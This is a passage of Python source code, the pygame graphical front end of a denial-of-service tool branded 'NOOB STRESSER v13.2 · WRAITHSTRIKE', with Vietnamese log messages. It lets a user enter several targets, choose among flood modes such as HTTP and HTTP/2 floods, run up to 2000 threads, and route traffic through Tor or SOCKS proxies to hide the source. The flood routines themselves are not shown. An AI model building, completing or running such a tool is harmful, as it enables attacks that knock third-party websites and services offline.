                        self.inp_duration, self.inp_proxy_h, self.inp_proxy_p]

        self._proxy_on      = False
        self._proxy_status  = "UNCHECKED"  # UNCHECKED / CHECKING / CONNECTED / OFFLINE
        self._proxy_btn_rect   = pygame.Rect(270, 433, 130, 28)
        self._proxy_check_btn  = pygame.Rect(410, 433, 110, 28)
        self._proxy_btn_pressed      = False
        self._proxy_check_pressed    = False
        self._btn_rect = pygame.Rect(14, 450, 250, 48)

        self._stat_boxes = [
            (pygame.Rect(14,  518, 220, 70), "SENT (req count)",  "sent",   C_RED_GLOW),
            (pygame.Rect(244, 518, 220, 70), "ERRORS",            "errors", C_ORANGE),
            (pygame.Rect(474, 518, 220, 70), "SEND/s",            "rps",    C_GREEN),
            (pygame.Rect(704, 518, 220, 70), "REMAIN",            "remain", C_CYAN),
        ]
        self._pb_rect = (14, 598, 972, 12)
        self._log = LogPanel(14, 622, 972, 112)

        self._log.add("[NOOB STRESSER v13.2 · WRAITHSTRIKE] ready", "ok")
        self._log.add("[SYS] HTTP/2 flood + multi-target + proxy button", "info")
        if HTTPX_OK:
            self._log.add("[SYS] httpx[h2] OK — HTTP/2 sẵn sàng (50 streams/conn)", "ok")
        else:
            self._log.add("[!] HTTP/2 cần: pip install httpx[h2]", "warn")
        if SOCKS_OK:
            self._log.add("[SYS] PySocks OK — TCP proxy/Tor sẵn sàng (UDP bypass proxy)", "ok")
        else:
            self._log.add("[!] PySocks chưa cài — chạy: pip install PySocks", "warn")

        self._anim_t = 0

    def _do_proxy_check(self):
        ph = self.inp_proxy_h.text.strip() or "127.0.0.1"
        pp = self._parse_port(self.inp_proxy_p.text, 9050)
        self._proxy_status = "CHECKING"
        self._log.add(f"[PROXY] Đang test {ph}:{pp} ...", "info")
        def _run():
            ok = _check_proxy(ph, pp)
            self._proxy_status = "CONNECTED" if ok else "OFFLINE"
            if ok:
                self._log.add(f"[PROXY] {ph}:{pp} → CONNECTED ✓", "ok")
            else:
                self._log.add(f"[PROXY] {ph}:{pp} → OFFLINE ✗ (Tor chưa bật?)", "error")
        threading.Thread(target=_run, daemon=True).start()

    def _selected_mode(self):
        for c in self._cards:
            if c.selected: return c.name
        return "HTTP Flood"

    # ── Fix #7: port validation 1-65535 ──────────────────────────────────────
    def _parse_port(self, text, default=80):
        try:
            p = int(text)
            if 1 <= p <= 65535: return p
            self._log.add(f"[!] Port {p} ngoài khoảng 1–65535, dùng {default}", "warn")
            return default
        except ValueError:
            return default

    def _start(self):
        global _PROXY_ENABLED, _PROXY_HOST, _PROXY_PORT, _PROXY_TYPE

        # multi-target parse
        raw_targets = self.inp_target.text.strip()
        if not raw_targets:
            self._log.add("[!] Nhập target trước", "error"); return
        targets = [t.strip() for t in raw_targets.split(",") if t.strip()]
        if not targets:
            self._log.add("[!] Target không hợp lệ", "error"); return

        port     = self._parse_port(self.inp_port.text, 80)
        try: total_threads = max(1, min(int(self.inp_threads.text), 2000))
        except: total_threads = 100
        try: duration = max(1, int(self.inp_duration.text))
        except: duration = 60

        _PROXY_ENABLED = self._proxy_on
        _PROXY_HOST    = self.inp_proxy_h.text.strip() or "127.0.0.1"
        _PROXY_PORT    = self._parse_port(self.inp_proxy_p.text, 9050)

        mode = self._selected_mode()
        fn   = ATTACK_MAP.get(mode)
        if not fn: return

        # HTTP/2 check
        if mode == "HTTP/2 Flood" and not HTTPX_OK:
            self._log.add("[!] HTTP/2 cần: pip install httpx[h2] — fallback HTTP+HTTPS", "warn")

        self._running      = True
        self._stop_ev      = threading.Event()
        self._stats        = {"sent": 0, "errors": 0}
        self._start_ts     = time.time()
        self._duration     = duration
        self._last_log_sec = -1

        # Fix #15: chia threads đều, phần dư vào target đầu tiên
        n = len(targets)
        per_target = max(1, total_threads // n)
        remainder  = total_threads - per_target * n
        proxy_info = f" | proxy={_PROXY_HOST}:{_PROXY_PORT}" if _PROXY_ENABLED else ""
        self._log.add(
            f"[▶] {len(targets)} target(s) × {per_target}t = {per_target*len(targets)}t | "
            f"{duration}s | {mode}{proxy_info}", "ok")

        for i, host in enumerate(targets):
            t_count = per_target + (remainder if i == 0 else 0)
            self._log.add(f"    → {host}:{port} ({t_count}t)", "info")
            threading.Thread(
                target=_spawn_threads,
                args=(fn, host, port, t_count, self._stop_ev, self._stats, duration),
                daemon=True
            ).start()

    def _stop(self, auto=False):
        self._stop_ev.set()
        self._running = False
        # Fix #11: restore GC threshold đúng về default gốc
        gc.set_threshold(*_GC_DEFAULT)
        elapsed = max(time.time() - self._start_ts, 0.1)
        rps = int(self._stats["sent"] / elapsed)
        tag = "ok" if not auto else "stat"
        self._log.add(f"[■] {'Auto-stop' if auto else 'Done'} — sent:{self._stats['sent']:,} "
                      f"err:{self._stats['errors']:,} avg:{rps}/s elapsed:{elapsed:.1f}s", tag)

    def _draw_section_label(self, x, y, text):
        pygame.draw.line(self.surf, C_BORDER, (x, y+7), (x+972, y+7))
        lbl = self.f_meta.render(text, True, C_RED)
        bg  = pygame.Surface((lbl.get_width()+8, lbl.get_height()), pygame.SRCALPHA)
        bg.fill((*C_BG, 255))
        self.surf.blit(bg, (x+8, y)); self.surf.blit(lbl, (x+12, y))

    def _draw(self):
        self.surf.blit(self._bg, (0,0))

        # header
        draw_rect_3d(self.surf, (0,0,W,70), (12,4,4), depth=0)
        pygame.draw.line(self.surf, C_BORDER, (0,70), (W,70))
        for i in range(3):
            pygame.draw.line(self.surf, C_RED, (0,69-i), (W,69-i))
        draw_text_glow(self.surf, "☠  NOOB STRESSER  ☠",
                       self.f_title, C_RED_GLOW, (W//2-165, 10),
                       glow_color=C_RED, glow_r=6)
        pulse = (math.sin(self._anim_t*0.003)+1)/2
        pcol = tuple(int(C_RED_DIM[i]+(C_RED_GLOW[i]-C_RED_DIM[i])*pulse) for i in range(3))
        pygame.draw.circle(self.surf, pcol, (W-20, 20), 6)
        draw_glow_rect(self.surf, (W-26,14,12,12), pcol, radius=6, alpha=60)
        sub = self.f_sub.render("v13.3  ·  WRAITHSTRIKE  ·  13 MODES  ·  AUDIT FIXED  ·  MULTI-TARGET", True, C_DIM)
        self.surf.blit(sub, (W//2-sub.get_width()//2, 44))

        # modes
        self._draw_section_label(14, 158, "◈  SELECT MODE")
        for card in self._cards:
            card.draw(self.surf, self.f_mode, self.f_meta)

        # config
        self._draw_section_label(14, 360, "◈  CONFIG")
        for inp in self._inputs:
            inp.draw(self.surf, self.f_mode, self.f_label)

        # proxy toggle button 3D
        proxy_bc  = (20,8,8) if self._proxy_on else (12,10,10)
        proxy_bb  = C_RED if self._proxy_on else C_DIM
        proxy_txt = "PROXY ON" if self._proxy_on else "PROXY OFF"
        proxy_tc  = C_RED_GLOW if self._proxy_on else C_DIM
        if self._proxy_on:
            draw_glow_rect(self.surf, tuple(self._proxy_btn_rect), C_RED, radius=6, alpha=40)
        draw_rect_3d(self.surf, tuple(self._proxy_btn_rect), proxy_bc,
                     depth=3, pressed=self._proxy_btn_pressed)
        pygame.draw.rect(self.surf, proxy_bb, self._proxy_btn_rect, 1, border_radius=6)
        ps = self.f_mode.render(proxy_txt, True, proxy_tc)
        self.surf.blit(ps, (self._proxy_btn_rect.x + self._proxy_btn_rect.w//2 - ps.get_width()//2,
                            self._proxy_btn_rect.y + self._proxy_btn_rect.h//2 - ps.get_height()//2))

        # proxy check button
        draw_rect_3d(self.surf, tuple(self._proxy_check_btn), (12,10,10),
                     depth=3, pressed=self._proxy_check_pressed)
        pygame.draw.rect(self.surf, C_DIM, self._proxy_check_btn, 1, border_radius=6)
        cs = self.f_mode.render("CHECK PROXY", True, C_CYAN)
        self.surf.blit(cs, (self._proxy_check_btn.x + self._proxy_check_btn.w//2 - cs.get_width()//2,
                            self._proxy_check_btn.y + self._proxy_check_btn.h//2 - cs.get_height()//2))

        # proxy status label
        ST_COL = {"UNCHECKED": C_DIM, "CHECKING": C_YELLOW,
                  "CONNECTED": C_GREEN, "OFFLINE": C_RED_GLOW}
        ST_ICO = {"UNCHECKED": "◌", "CHECKING": "◉",
                  "CONNECTED": "●", "OFFLINE": "✗"}
        scol = ST_COL.get(self._proxy_status, C_DIM)
        sico = ST_ICO.get(self._proxy_status, "◌")
        stxt = self.f_mode.render(f"{sico} {self._proxy_status}", True, scol)
        self.surf.blit(stxt, (530, 440))
        self.surf.blit(self.f_meta.render("(TCP only — UDP bypasses)", True, C_DIM), (530, 452))

        # launch button
        if self._running:
            bc = (20,20,20); bb = C_DIM; bt = "■  STOP"; btc = C_DIM
        else:
            bc = (18,6,6); bb = C_RED; bt = "▶  LAUNCH"; btc = C_RED_GLOW
            draw_glow_rect(self.surf, tuple(self._btn_rect), C_RED, radius=10,
                           alpha=int(30+20*((math.sin(self._anim_t*0.004)+1)/2)))
        draw_rect_3d(self.surf, tuple(self._btn_rect), bc, depth=4, pressed=self._btn_pressed)
        pygame.draw.rect(self.surf, bb, self._btn_rect, 1, border_radius=6)
        bt_s = self.f_btn.render(bt, True, btc)
        bx = self._btn_rect.x + self._btn_rect.w//2 - bt_s.get_width()//2
        by = self._btn_rect.y + self._btn_rect.h//2 - bt_s.get_height()//2
        if self._btn_pressed: bx+=1; by+=1
        self.surf.blit(bt_s, (bx, by))

        # stats
        elapsed = time.time()-self._start_ts if self._running else 0
        rps     = int(self._stats["sent"]/max(elapsed,0.1)) if self._running else 0
        remain  = max(0, self._duration-elapsed) if self._running else 0
        vals    = {"sent":   f"{self._stats['sent']:,}",
                   "errors": f"{self._stats['errors']:,}",
                   "rps":    f"{rps:,}",
                   "remain": f"{int(remain)}s"}

        self._draw_section_label(14, 500, "◈  STATS  (SENT = sendall success, not server ack)")
        for rect, label, key, col in self._stat_boxes:
            draw_rect_3d(self.surf, tuple(rect), C_PANEL, depth=3)
            pygame.draw.rect(self.surf, C_BORDER, rect, 1, border_radius=6)
            self.surf.blit(self.f_stat_s.render(label, True, C_DIM), (rect.x+8, rect.y+6))
            val = self.f_stat_l.render(vals[key], True, col)
            self.surf.blit(val, (rect.x+rect.w//2-val.get_width()//2, rect.y+rect.h//2))
            if self._running: draw_glow_rect(self.surf, tuple(rect), col, radius=5, alpha=20)

        pct = min(elapsed/max(self._duration,1), 1.0) if self._running else 0
        draw_progress_bar(self.surf, self._pb_rect, pct)
        self._draw_section_label(14, 610, "◈  LOG")
        self._log.draw(self.surf, self.f_log)
        draw_scanlines(self.surf)
        pygame.display.flip()

    def run(self):
        while True:
            dt = self.clock.tick(60)
            self._anim_t += dt

            for ev in pygame.event.get():
                if ev.type == pygame.QUIT:
                    if self._running: self._stop_ev.set()
                    pygame.quit(); sys.exit()
                for inp in self._inputs:
                    inp.handle_event(ev)
                for inp in self._inputs:
                    inp.update(dt)
                for card in self._cards:
                    if card.handle_event(ev):
                        for c in self._cards: c.selected = False
                        card.selected = True
                if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                    if self._proxy_btn_rect.collidepoint(ev.pos):
                        self._proxy_btn_pressed = True
                    if self._proxy_check_btn.collidepoint(ev.pos):
                        self._proxy_check_pressed = True
                if ev.type == pygame.MOUSEBUTTONUP and ev.button == 1:
                    if self._proxy_btn_pressed:
                        self._proxy_btn_pressed = False
                        if self._proxy_btn_rect.collidepoint(ev.pos):
                            self._proxy_on = not self._proxy_on
                            self._proxy_status = "UNCHECKED"
                            self._log.add(
                                f"[PROXY] {'BẬT' if self._proxy_on else 'TẮT'} — "
                                + ("nhấn CHECK để kiểm tra" if self._proxy_on else "tắt xong"),
                                "ok" if self._proxy_on else "info")
                    if self._proxy_check_pressed:
                        self._proxy_check_pressed = False
                        if self._proxy_check_btn.collidepoint(ev.pos):
                            self._do_proxy_check()
                if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                    if self._btn_rect.collidepoint(ev.pos): self._btn_pressed = True
                if ev.type == pygame.MOUSEBUTTONUP and ev.button == 1:
                    if self._btn_pressed:
                        self._btn_pressed = False
                        if self._btn_rect.collidepoint(ev.pos):
                            if not self._running: self._start()
                            else: self._stop()

            # Fix #5: GUI auto-stop check — nhưng deadline thread đã set stop_ev rồi
            if self._running and self._stop_ev.is_set():
                self._stop(auto=True)

            # Fix #12: stat log không duplicate — track giây đã log
            if self._running:
                elapsed = time.time() - self._start_ts
                cur_sec = int(elapsed)
                if cur_sec > 0 and cur_sec % 5 == 0 and cur_sec != self._last_log_sec:
                    self._last_log_sec = cur_sec
                    rps    = int(self._stats["sent"] / max(elapsed, 0.1))
                    remain = max(0, self._duration - elapsed)
                    self._log.add(
                        f"[STAT] sent:{self._stats['sent']:,} err:{self._stats['errors']:,} "
                        f"{rps}/s remain:{int(remain)}s", "stat")

            self._draw()


if __name__ == "__main__":
    NoobApp().run()
